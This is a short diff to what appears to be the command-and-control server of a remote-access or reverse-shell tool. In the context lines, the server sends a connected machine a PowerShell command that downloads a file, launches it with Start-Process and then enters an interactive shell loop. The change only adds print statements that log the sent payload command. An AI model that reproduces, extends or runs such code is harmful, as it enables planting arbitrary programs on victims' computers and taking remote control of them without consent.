@@ -45,7 +45,8 @@ def handle_client(conn, addr, local_ip):
             f"-OutFile '{FILE_NAME}'; Start-Process '{FILE_NAME}'\"\n"
         )
         conn.sendall(download_command.encode())
-
+        print("[+] Payload download command sent.")
+        print("[+]    command: ", download_command.strip())
         # Begin shell loop
         while True:
             try:
